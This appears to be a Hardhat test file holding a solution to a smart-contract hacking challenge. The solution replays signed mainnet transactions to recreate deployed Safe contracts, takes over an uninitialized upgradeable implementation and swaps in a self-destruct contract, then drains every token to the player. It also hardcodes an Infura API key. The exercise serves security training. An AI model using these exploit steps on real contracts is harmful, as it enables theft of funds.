const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Wallet mining', function () {
    let deployer, player;
    let token, authorizer, walletDeployer;
    let initialWalletDeployerTokenBalance;
    
    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, ward, player ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy authorizer with the corresponding proxy
        authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
            [ [ ward.address ], [ DEPOSIT_ADDRESS ] ], // initialization data
            { kind: 'uups', initializer: 'init' }
        );
        
        expect(await authorizer.owner()).to.eq(deployer.address);
        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
            token.address
        );
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(token.address);
        
        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(authorizer.address);
        expect(await walletDeployer.mom()).to.eq(authorizer.address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
        await token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

        // Deposit large amount of DVT tokens to the deposit address
        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await token.balanceOf(walletDeployer.address)).eq(
            initialWalletDeployerTokenBalance
        );
        expect(await token.balanceOf(player.address)).eq(0);
    });

    it('Execution', async function () {
        const mainnetProvider = new ethers.providers.InfuraProvider(
            "mainnet",
            "becb033f3bc54e01b6213b3a4f7665a3"
        );
        tx0 = await mainnetProvider.getTransaction("0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3");
        tx1 = await mainnetProvider.getTransaction("0x31ae8a26075d0f18b81d3abe2ad8aeca8816c97aff87728f2b10af0241e9b3d4");
        tx2 = await mainnetProvider.getTransaction("0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261");
        unsignedTx0 = {
            to: tx0.to,
            nonce: tx0.nonce,
            gasLimit: tx0.gasLimit,
            gasPrice: tx0.gasPrice,
            data: tx0.data,
            value: tx0.value,
            chainId: tx0.chainId
        };
        unsignedTx1 = {
            to: tx1.to,
            nonce: tx1.nonce,
            gasLimit: tx1.gasLimit,
            gasPrice: tx1.gasPrice,
            data: tx1.data,
            value: tx1.value,
            chainId: tx1.chainId
        };
        unsignedTx2 = {
            to: tx2.to,
            nonce: tx2.nonce,
            gasLimit: tx2.gasLimit,
            gasPrice: tx2.gasPrice,
            data: tx2.data,
            value: tx2.value,
            chainId: tx2.chainId
        };
        signature0 = {
            v: tx0.v,
            r: tx0.r,
            s: tx0.s
        }
        signature1 = {
            v: tx1.v,
            r: tx1.r,
            s: tx1.s
        }
        signature2 = {
            v: tx2.v,
            r: tx2.r,
            s: tx2.s
        }
        rawTx0 = ethers.utils.serializeTransaction(unsignedTx0, signature0);
        rawTx1 = ethers.utils.serializeTransaction(unsignedTx1, signature1);
        rawTx2 = ethers.utils.serializeTransaction(unsignedTx2, signature2);
        await player.sendTransaction({to: "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A", value: 10n**17n});
        await ethers.provider.sendTransaction(rawTx0);
        await ethers.provider.sendTransaction(rawTx1);
        await ethers.provider.sendTransaction(rawTx2);
        proxyFactory = await ethers.getContractAt("GnosisSafeProxyFactory", "0x76e2cfc1f5fa8f6a5b3fc4c8f4788f0116861f9b", player);
        masterCopy = await ethers.getContractAt("GnosisSafe", "0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F", player);

        authorizerImplmentation = await (await ethers.getContractFactory('AuthorizerUpgradeable')).attach('0xe7f1725e7734ce288f8367e1bb143e90bb3f0512');
        badAuthorizer = await (await ethers.getContractFactory('BadAuthorizerUpgradeable', player)).deploy();
        dieABI = ["function die(address player)"];
        dieInterface = new ethers.utils.Interface(dieABI);
        dieCallData = dieInterface.encodeFunctionData("die", [player.address]); 
        await authorizerImplmentation.init([], []);
        await authorizerImplmentation.upgradeToAndCall(badAuthorizer.address, dieCallData);

        attacker = await (await ethers.getContractFactory('WalletMiningAttacker', player)).deploy(walletDeployer.address);

        await attacker.attack();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq('0x');

        // Master copy account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.not.eq('0x');

        // Deposit account must have code
        expect(
            await ethers.provider.getCode(DEPOSIT_ADDRESS)
        ).to.not.eq('0x');
        
        // The deposit address and the Safe Deployer contract must not hold tokens
        expect(
            await token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq(0);
        expect(
            await token.balanceOf(walletDeployer.address)
        ).to.eq(0);

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)); 
    });
});
